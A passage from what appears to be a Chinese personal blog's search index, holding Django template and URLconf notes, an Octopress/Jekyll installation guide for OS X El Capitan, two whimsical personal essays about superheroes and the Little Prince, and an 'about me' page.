\u003cp\u003eThanks for visiting my site.\u003c/p\u003e {% endblock %} \u003c/body\u003e \u003c/html\u003e {% endraw %} 看出，模板是基于 Html 的，事实上它就是保存成一个 .html 文件，它跟我们所看到的 html 的区别就在于多了一些由 {% raw %}{{ }}{% endraw %}括起来的变量以及由{% raw %}{% %}{% endraw %}括起来的模板标签，此外变量还通过过滤器 |来对文本输出格式进行转换。而这里 {% raw %}{{ }}{% endraw %} 里的变量相当于一个形参，真正显示出来的是在我们渲染模板的 Python 文件里所传给它的值。 比如在下面的模板渲染代码里 c = Context({'person_name':'LexusLee', 'company': 'UESTC', 'ship_date':datetime.date(2015,09,24), 'ordered_warranty': False}) 那么模板中的 person_name 最终显示的就是 LexusLee 。 ","date":"2015-11-16","objectID":"/zh-cn/django-learning2/:1:0","tags":["Python","Django"],"title":" Django 学习笔记2-- Templates ","uri":"/zh-cn/django-learning2/"},{"categories":["Code","Python"],"content":"模板标签 {% raw %}{% if variable %} {% else %} {% endif %}{% endraw %}用于判断变量 variable 是否为真，为真则执行 else 标签前的内容，否则执行 else 便签内的内容，跟大部分编程语言中的条件语句用法一致。 同理{% raw %}{% for %} {% endfor %}{% endraw %}的用法也和大部分编程语言中循环语句的用法一致。需要注意的是，每个 for 循环中还有一个成为{% raw %}{% forloop %}{% endraw %}的模板变量，这个变量能提示一些循环进度信息相关的属性，关于这个变量的详细统发可以参照这一节。 {% raw %}{% block content %} {% endblock %}{% endraw %}是用来处理模板继承和重载的标签，来避免重复和冗余的代码。比如上述的实例模板( base.html )中，我希望在多个文件中都能显示 footer ，而不需要重复编码，故在该模板中写了{% raw %}{% block footer %}{% endraw %},而在另一个文件中只需要写 {% raw %} {% extends \"base.html\" %} {% block footer %} \u003ca href=\"https://github.com/thehackercat\"\u003eGithub\u003c/a\u003e {% endblock %} {% endraw %} 这样所有的 footer 中都会有 \u003ca href=\"https://github.com/thehackercat\"\u003eGithub\u003c/a\u003e 这行代码。而之前{% raw %}{% block footer %} {% endblock %}{% endraw %}框中的代码将会被 overwrite ，也就是说对于重载模块，子模板可以重载这些部分，如果子模板不重载这些部分，则会按照默认的内容显示。 4.{% raw %}{% load staticfiles %}{% endraw %}用来加载静态资源，比如加载 CSS 、 JS 等静态文件时会用到。 5.{% raw %}{# #}{% endraw %} 用于注释。 ","date":"2015-11-16","objectID":"/zh-cn/django-learning2/:2:0","tags":["Python","Django"],"title":" Django 学习笔记2-- Templates ","uri":"/zh-cn/django-learning2/"},{"categories":["Code","Python"],"content":"今天好像巴黎有点乱，希望明天太阳还会照常升起。 ","date":"2015-11-14","objectID":"/zh-cn/django-learning1/:0:0","tags":["Python","Django"],"title":" Django 学习笔记1-- URLconf ","uri":"/zh-cn/django-learning1/"},{"categories":["Code","Python"],"content":"简介 Django 是一个由 Python 编写、开源并采用经典的 MVC 设计模式的 Web Full Stack 应用框架。 在 Django 中，控制器接受用户输入的部分由框架自行处理，所以 Django 里关注更多在模型( Model )、模板( Template )和视图( Views )，称为 MTV 模式。他们各自的职责如下： 模型( Model )，数据存取层：处理与数据相关的所有事务，即如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。 模板( Template )，表现层：处理与表现相关的决定，即如何在页面或其他类型文档中进行显示。 视图( View )，业务逻辑层：存取模型及调取恰当模板的相关逻辑。模型与模板之间的桥梁。 而 Django 的编译方式比较特别，他的 MVC 控制器部分由 URLconf 来实现。 ","date":"2015-11-14","objectID":"/zh-cn/django-learning1/:1:0","tags":["Python","Django"],"title":" Django 学习笔记1-- URLconf ","uri":"/zh-cn/django-learning1/"},{"categories":["Code","Python"],"content":"URLconf 当我在 Django 中编写完视图要想将其路由要页面上时，我发现了 Django 的 URLconf 路由机制，他实现了为相应的视图函数路由到相应界面的映射功能，也就是说，当用户访问了 http://127.0.0.1:8000/hello/ 时， Django 调用了视图 views.py 中的 hello () 函数。 from django.conf.urls import include, url from mysite.views import hello,current_datetime,hours_ahead,letter urlpatterns = [ url(r'^hello/$', hello), url(r'^time/$', current_datetime), url(r'^time/plus/(\\d{1,2})/ $',hours_ahead), ] 可以看出， URLconf 的路由是通过正则表达式来匹配一个完整的 hello 的 URL ，这样的话就可以保证 诸如 /hello/foo/ 等 URL 不会被匹配到。 为了更深入了解 URLconf 路由的机制，我找到了类似的 tornado 框架来对比。 注意到在其中 web.py 文件中的第2964行开始的如下代码： application = tornado.web.Application([ (r\"/\", MainHandler), ]) http_server = tornado.httpserver.HTTPServer(application) http_server.listen(options.port) tornado.ioloop.IOLoop.current( ).start( ) 可以看出 torando 现把一个路由表作为一个参数，传给 Application 类的构造函数，接着创建了一个实例，然后再把这个实例传递给 http_server 。那么当客户端发起get /请求的时候, http server 接收到这个请求，在路由表中匹配 url pattern ，最后交给 MainHandler 去处理。 这个机制跟 Django 的 URLconf 是类似的，都是通过在 pattern 中匹配好对应的 url 接着传给处理器来负责从路由表中检索并路由。 这种方法松耦合了 http server 层和 web application 层，从而让开发者可以专注于 web 应用的逻辑层，很好！ ：D ","date":"2015-11-14","objectID":"/zh-cn/django-learning1/:2:0","tags":["Python","Django"],"title":" Django 学习笔记1-- URLconf ","uri":"/zh-cn/django-learning1/"},{"categories":["Code","Python"],"content":"Django 如何处理请求 所以了解过了 Django 的 URLconf 机制后，我开始思考他是如何处理请求的。 我开启服务器后在地址栏中输入 http://127.0.0.1:8000/time/plus/20/ 然后花现处理路线如下： 进来的请求转入 /time/plus/20/ . Django 通过在 ROOT_URLCONF 配置来决定根 URLconf . Django 在 URLconf 中的所有 URL 模式中，查找第一个匹配 /time/plus/20/ 的条目。 如果找到匹配，将调用相应的视图函数 如果没找到匹配，则返回相应的 Http 状态码 (如图) 视图函数返回一个HttpResponse Django 转换 HttpResponse 为一个适合的 HTTP response ，以 Web page 显示出来 ","date":"2015-11-14","objectID":"/zh-cn/django-learning1/:3:0","tags":["Python","Django"],"title":" Django 学习笔记1-- URLconf ","uri":"/zh-cn/django-learning1/"},{"categories":["Code"],"content":"最近把个人博客搭好了，用了Octopress,一个基于 Jekyll 的集成开发工具。 原来 CSDN 的那个『骇客猫』弃坑了。 ","date":"2015-11-09","objectID":"/zh-cn/fix-the-datetime-bug/:0:0","tags":["Octopress"],"title":"使用Octopress搭建静态博客","uri":"/zh-cn/fix-the-datetime-bug/"},{"categories":["Code"],"content":"安装和配置. Octopress 的安装配置比较简单，是需要按照官网或者网上一些教程一步步走即可。 由于我在2015年10月1日更新了 OS X EI Capitan，新系统在权限设置上增加了 System Integrity Protection (SIP) 来提高系统安全性并且在 System Library 的路径上作了修改，导致了一些安装 Jekyll 时出现的异常，罗列如下： 如果你使用命令行 $ gem install jekyll 安装 Jekyll 时 遇到了如下问题： ERROR: While executing gem ... (Errno::EPERM) Operation not permitted - /usr/bin/jekyll 辣么尝试使用 $ sudo gem install -n /usr/local/bin/ jekyll 从而有效地避开 EI Captian 中 rootless 用户的权限问题。 或者有更彻底的办法，在终端输入 $ export PATH=/usr/local/bin:$PATH 这样会将原来 /usr/bin 的路径更改为 /usr/local/bin ，然后再进行安装，一劳永逸，但我不建议这么做。 如果你在进行上述操作时遇见了如下问题： 在命令行中输入 ```$ xcode-select —install```就可以安装了。 辣么你应该没有安装 OS X developer tools ，安装后才能编译一些 ruby 的原生的拓展插件。 在命令行中输入 $ xcode-select —install就可以安装了。 如果你遇到了任何 Permission denied 的问题： ERROR: While executing gem ... (Errno::EACCES) Permission denied 辣么在命令行之前加上 $ sudo 。 ","date":"2015-11-09","objectID":"/zh-cn/fix-the-datetime-bug/:1:0","tags":["Octopress"],"title":"使用Octopress搭建静态博客","uri":"/zh-cn/fix-the-datetime-bug/"},{"categories":["Code"],"content":"个性化修改 对于我的博客的个性化修改我主要做了以下三个： 第三方主题：Octopress有很多第三方主题安装也很便捷。 插件安装：可以在 /plugins 目录下安装一些第三方插件，诸如 Disqus 评论系统、 Twitter 的时间线等。 样式修改：我在 /sass/custom/_styles.scss 中修改了字体、 blog 的行间距以及一些边边角角的地方。 我使用了第三方主题 cleanpress 她极简的风格很吸引我，但是这个主题有蛮多 bug 的。 比如，在首页会遇见一个博客的 post 时间无法显示导致日历图标和目录图标重合的问题，如下所示： 经过一上午的 debug ，我发现了在 /source/_includes/post/date.html 第11行 date_formatted 是没有声明 formatted 的格式的从而导致了无法显示。 故我将其替换成了 date | date: \"%b %e, %Y\" 然后就可以显示出 format 后的时间了。 还有在发布超过20字的标题的博客时，首页的相应博客处会出现样式错误， date_line 会与标题重叠在一起。 这两个 bug 我都已修复并提交了，在这里可以查看并修改。 我使用了第三方插件 Disqus 非常棒的评论系统，以及 Twitter Timeline 也是非常棒的时光机插件。根据官网的教程很容易安装并使用。 接着我还修改了样式，其中把全局字体改成了谷歌和 Adobe 联合发布的 思源黑体 ，漂亮得不像实力派。修改过程主要参考了这篇文章。其中每个不同的 Adobe 账户需要插入的是不同的 Typekit 代码( Adobe 会帮你自动生成代码)。但需要注意的是 Adobe Typekit 虽然不是免费服务，但也有免费方案可以选择，注册后有每月 25,000 次的浏览次数额度，对于一般个人 blog 或小型网站来说其实还算充裕（当然你也可以考虑付费升级，价格并不高 ：P ）。 ","date":"2015-11-09","objectID":"/zh-cn/fix-the-datetime-bug/:2:0","tags":["Octopress"],"title":"使用Octopress搭建静态博客","uri":"/zh-cn/fix-the-datetime-bug/"},{"categories":["Code"],"content":"为什么是蜘蛛侠 ？ 嗷，其实是这样的，熟悉我的人就知道，我个人是漫威巨粉，而先前我看到 cleanpress 的 demo 页是酱的图片我很喜欢，并且想起来蜘蛛侠要回归漫威了, 再看绿箭我就节食5分钟！ 这就像苯宝宝又要回归已经弃坑的绿箭侠一样鸡冻。 ","date":"2015-11-09","objectID":"/zh-cn/fix-the-datetime-bug/:3:0","tags":["Octopress"],"title":"使用Octopress搭建静态博客","uri":"/zh-cn/fix-the-datetime-bug/"},{"categories":["gossip"],"content":"从小，我就想做英雄大侠。 长着翅膀，穿梭云雾间如探囊取物的那种。 我幻想着， 有一天我能够被基因拼接后的老鹰咬一口， 白天老老实实上班， 晚上却化身老鹰侠。 戴上面具， 展开翅膀， 去消灭世界上所有的坏蛋。 于是老鹰侠兴高采烈地跑去告诉老爸这个想法。 老爸沉默了好久，才如梦初醒， 终于做出了回应。 他十分激动地顺手拿起了手边的书， 劈头盖脸地向老鹰侠打去， 边打还边说： “你爹我文曲星转世，学没富五车，富辆皮卡还是有的， 靠着这张嘴打架也没输过谁，上能识天象闻天下，下能解鸡兔同笼奥数题， 不说是什么千秋万代的伟人，好歹也是黑夜中最耀眼的那颗星。 你老子我尚且不能当什么大侠，你小子跟我装什么逼！” 老爸一套招式行云流水不带喘精准无误地命中了我瘦弱的身躯。 当时我就懵逼了。 “你儿子我一颗红心向祖国，先不说牺牲了写作业的时间去打坏蛋，好歹也是单纯地希望着这个世界好人能得到褒 赏，坏人能受到仲裁。法律做不到的我来做。这种跨时代的vigilante思想，却受到了守旧派文曲星转世的打 压。悲哀！ 哼╭(╯^╰)╮” 当然了，想归想。 在强权面前， 羁傲不逊的老鹰侠还是选择了低头。 带着书卷气的这顿揍最终还是抑制住了大脑的气血上涌。 然而这种气血上涌， 随着我年龄渐长， 越发演绎到极致。 我开始怀疑， 为什么有人会利用人类的善良来作为谋利的工具。 为什么有人会去折磨一些比自己弱小的生灵。 为什么有人能从看着别人受难中取乐。 我很不开心。 为什么善良的人应该承受比他人更多的痛楚， 而邪恶的人却可以嚣张跋扈逍遥自得。 我学会暴怒。 眼眶发红，咬牙切齿。 我想把坏人们都撕碎。 我要他们都知道痛苦总是平等传递的， 欺负任何生命都是不被允许的。 至少， 不被我允许！ 我还是长大了啊。 我开始明白，做个基因拼接的超人，是比较不现实的 T.T 我开始偷偷学电工，画铠甲， 试图做个像钢铁侠那样的英雄。（是的，在我还不认识Tony Stark的时候，我就先有了做钢铁侠的想法了。） 刀枪不入，所向披靡。 任何装备的坏人都妄想阻止神装的我。 然而很不辛， 我的手稿最终还是被名侦探文曲星转世找着了。 我爸很快就明白了我的意图， 而我也直言不讳， “我想制造个世界，那里只有好人活着，大家见面时点头微笑，不用武装，不用伪装。而我可以从人们清澈的眼神里看到折射的太阳光。他们偶尔抬头，发现这个世界依旧温软善良。” 我估计当时我爸听完肠子都悔青了， “完了完了，一世英名就要毁在这臭小子手里了。” 因为当时老爸并没有再沉默， 他直接用数学卷抽了我一耳光。 “作业写完了吗？没写完画什么鸟人！” 我想，大概是他把我精心设计的 「宇宙无敌钛合金钢铁老鹰侠小虚大魔王一号」 当做了鸟人吧。 羞辱！大大的羞辱！ 不能忍了！ 于是，我奋起反抗， 强烈谴责老爸侮辱艺术，侮辱科技，侮辱未来。 而我老爸也是个精干的人，不逼逼，直接劈头盖脸一顿揍。 “你小子数学考成这样，你跟我谈科技，跟我谈教育面向现代化，面向世界，面向未来？！” 那一刻， 我突然获得了一种神祗般的平静。 我明白自己太弱了， 这个世界过分强势得太多了， 聪明人不该反复迎头而上。 至少， 不该再挨第三顿揍了。 所以， 我尝试慢慢把愤怒变为理解。 我理解这个世界， 理解一切循规蹈矩和荒腔走板， 一切汲汲营营和独辟蹊径。 如果可以的话， 也想跟他们称兄道弟， 这是最敏感的人的生存方式， 我知道它想要什么， 它想要一个识时务的俊杰， 可是我真的不想做。 我想做一个大侠， 像一阵风一样的大侠。 我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的。 ——哈维尔 这个答案在知乎上 获得了6928个赞。 而我曾经给这个回答点了个向下的箭头。 大概是我曾觉得， 有时候最能解决问题的方法， 不一定是对的，却是最有效的。 Vigilante 是不对的，但可能是最有效的。 如果能做一个绝望但细润无声的生命体， 那我愿意接盘背锅。 我想，大概是因为 我是一个间距很大的人， 永远无法在生活的漫漫长河里筛出那些温情闪光的瞬间来普渡众人。 我更像是行走的钢丝， 所到之处都是血案。 这种偏执一直持续到我前几天看了一个视频。 有那么一刻， 从一个男人的角度。 我觉得这个人帅毙了。 比蝙蝠侠，钢铁侠，蜘蛛侠，绿箭侠，老鹰侠都帅！ 我突然找到了一种， 作为一个全然的自己， 去和这个世界平等的相处。 我既不能仲裁别人的生死， 别人也不能干扰我的心境。 我要像这个男人一样， 我暂时不想去当什么英雄大侠了。 我只想做个「鹿尤」一样的长颈鹿侠。 把阳光，微笑和温柔善良带给身边的人。 蝙蝠侠，钢铁侠，蜘蛛侠，绿箭侠，老鹰侠 他们也许能穿梭云雾间， 窥探云层中的奥秘。 他们有自己黑暗骑士的信条， 而我也有自己的理解和克制。 人们会欢呼于他们的招招致命的凌厉，轰隆作响的正义。 我却折服于他们对生命的谦卑的那一瞬。 他们公演一个神话， 而我，书写一个笑话， 奢求这个世界的微笑。 挺好。 ","date":"2015-05-16","objectID":"/zh-cn/giraffe-man/:0:0","tags":["gossip","superhero"],"title":"长颈鹿侠","uri":"/zh-cn/giraffe-man/"},{"categories":["Gossip"],"content":"小王子的星球上忽然绽放了一朵娇艳的玫瑰花。 在我没长牙前，我就知道，草是绿的，花是红的，眼泪是咸的，口水是黏的，漂亮阿姨上厕所是不能偷看的。 在我长牙约莫拾几朵玫瑰花之后，我开始明白，玫瑰是不能摘的，春天是追不到的。 只能追，不能到！ 成都的春天鲜艳得很。 仿佛向整个天空泼上绿色的漆。 这也使玫瑰显得更加耀眼。 所以，小王子爱上这朵玫瑰，细心地呵护它。他以为，这是一朵唯一的花，只有他的星球上才有，其他的地方都不存在。 然而，玫瑰有刺，香水有毒。 当所有的女青年们一层腻子再一层粉盖住玻尿酸和肉毒杆菌微雕后的粉脸，闷几行code，写几首诗，拜读下冯 唐，再上微博刷个韩寒。 我开始发现，原来世界上有数百万朵这么完全一样的花儿。 这时，他才知道，他有的只是一朵普通的花。 然而，小王子并没有停止浇灌他的玫瑰花。 因为他知道，他星球上的那朵，仍然是独一无二的，他浇灌过它，用屏风保护过它，还倾听过它的哀怨自诩、它的孤单寂寞。 It is the time you have wasted for your rose that makes your rose so important. —- 小王子。 小王子注定不是个沾满胭脂味的人。 我也不是。 因为我还要纠结preg_match_all($rose，$spring,$you); 会不会报错。 //『从 ‘春天’ 里抓取 一朵’玫瑰’，传回给 ‘你’；』 我还要担心明天自己能否调整呼吸气定神闲地跟食堂阿姨要个豆浆鸡蛋饼。 然后默默保佑自己 听到闹钟就起床，上课不睡觉，代码一遍过，不得颈椎病。 我远不如小王子那样潇洒， 如果不能活得洒脱，那我选择活得机灵。 —- 小虚大魔王。 If I cant be dissolute, I prefer to die. —- 不要碧莲的小虚大魔王。 所以我想到多年前认识的一个机灵的朋友。 他是一只熊。 一只春天里的熊。 “最最喜欢你，绿子。” “什么程度？” “像喜欢春天的熊一样。” “春天的熊？什么春天的熊？” “春天的原野里，你，一个人正走着，对面走来一只可爱的小熊，浑身的毛活像天鹅绒，眼睛圆鼓鼓的。 它这么对你说道: ‘你好，小姐，和我一块儿打滚玩好么？’ 接着，你就和小熊抱在一起，顺着长满三叶草的山坡咕噜噜滚下来，整整玩了一大天，你说棒不棒？” “太棒了！” “我就是这么喜欢你！” 春天的熊哥注定是个极讨女孩子欢心的熊。 我却不是。 因为我既没有他那绒厚的脂肪来缓冲从山顶滚到山脚的摩擦，也没有他那清澈的晶状体房水来倒映出整个湛蓝的天。 然而，我还是很高兴能结识他们两个碧池碧莲。 他们鲜衣怒马，少年才俊。 他们就是牛逼， 新鲜的牛逼。 有空时， 我们聊聊教育面向现代化面向世界面向未来， 再吹逼一下世界霍乱时我们如何去拯救别人的爱情。 最后总结一下把整个春天都拥入怀里的250种方法。 看来所有不要脸的人都注定要相遇的。 成都的春天真绿啊。 阳光透过叶的缝隙小孔成像。 不规则地映射了一个季节。 不知道厦门的太阳是否温软？ 不知道可否有一天，我能够像小王子和春天的熊一样， 以真正牛逼的姿态再次相见。 大言不惭地说自己已经足够帅气足够有钱任性， 能依然对汲汲营营的名誉、条条框框的规则、战战兢兢的人情 不屑一顾， 对嘲讽和贬低的声音置之不理，保有与物质世界隔开距离的独到审美， 把所有的目光都留给美好、聪明、温柔的所在。 毕竟， 这才是我们和这个世界结交的缘由。 小王子走近这朵不期而至的玫瑰花。 风却把这朵玫瑰吹散。 花瓣迎着风， 在最高点乘着叶片向前飞。 小王子也迎着风向前追。 然而，扬起的风反而使玫瑰渐行渐远。 如果我不能像一阵风， 那么， 请让我追逐你风中飘忽不定的脸。 ","date":"2015-04-02","objectID":"/zh-cn/little-prince-and-bear/:0:0","tags":["Gossip","Bong"],"title":"小王子与春天的熊","uri":"/zh-cn/little-prince-and-bear/"},{"categories":null,"content":" 是清晨轻抚你脸庞的清风， 是夜里执剑走江湖的熊猫侠。 简述 我，是一个比较中二的程序员。 平时喜欢逛技术论坛 HackerNews、乌云 、InfoQ 等，同时还是 sae 认证的初级独立开发者. 早些年在乌云上提过漏洞, 折腾过网络安全. 目前技术栈集中在云平台开发，主要用到的语言是 Python/Golang，Python 吸引我在于他语法简洁语法糖易用，常被诟病的Python速度慢也在 Python3.6 之后的async出现后逐渐改善.不过在处理 CPU bound 任务时表现比较差, 这部分 Golang 则更好地解决了. 在编程之外，我还喜欢刷些 Dribbble 、 Pinterest 等设计师论坛，对其中精妙的设计十分着迷，对交互设计也有极大的兴趣，感觉一个 app 是为人服务的，应该贴切人类的使用习惯并遵循人类优质的审美风格。 在逛论坛之外，我还是这个星球上为数不多会说  小黄人语的少年，喜欢荒诞却有逻辑的事务，眼里所有的风车，都是条巨龙。 同时，我还是漫威巨粉，对一切超级英雄有着不切实际的幻想，喜欢追逐他们风中飘忽不定的脸。 为什么写博客 写博客一是记录我的生活, 等老去时能留下一些念想 二是技术上记录下我踩过的一些坑, 防止未来第二次掉入 希望这些我自己揣摩的东西能够真正对你产生帮助, 我也以次获取肯定, 一定会非常开心 当然了, 写的文章受限于时间和我对一些原理浅薄的揣摩, 难免有错, 也望指正 可以在评论中交流, 或通过  邮件,  LexusLee@Twitter 我. 我去过的电影节  2018 北京国际电影节  2019 北京国际电影节  2019 上海国际电影节  2019 台北电影节 想做的事 30 岁前看过 \u003e 3000 部电影 当一次超级英雄 让风停下来 🌪 接触过一次 👽 去过一趟西西里 看一次极光 ","date":"2019-08-02","objectID":"/zh-cn/about/:0:0","tags":null,"title":"关于我","uri":"/zh-cn/about/"}]